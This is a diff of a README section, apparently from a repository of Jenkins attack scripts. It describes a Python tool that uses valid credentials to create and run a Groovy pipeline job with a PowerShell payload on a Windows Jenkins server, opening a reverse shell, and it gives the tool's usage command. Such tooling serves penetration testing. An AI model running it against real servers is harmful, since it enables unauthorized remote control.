@@ -1,4 +1,4 @@
-## [win_revshell_groovy.py]
+## win_revshell_groovy.py
 This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
 The Jenkins server must be installed on Windows.\
 And Jenkins must have the "[workflow-cps](https://plugins.jenkins.io/workflow-cps/)" or "Pipeline: Groovy" plugin installed.\
@@ -12,7 +12,7 @@ Then configures it or BUILD a **"Pipeline script"** with the **Powershell** payl
 
 Finally, the script sends the instruction to execute this JOB.
 
-USAGE:
+USAGE:\
 python3 ./win_revshell_groovy.py -w URL -r LOCAL_IP -rp LOCAL_PORT
 ![win_revshell_groovy_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_3.png)
 ![win_revshell_groovy_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_groovy.py/images/win_revshell_groovy_4.png)
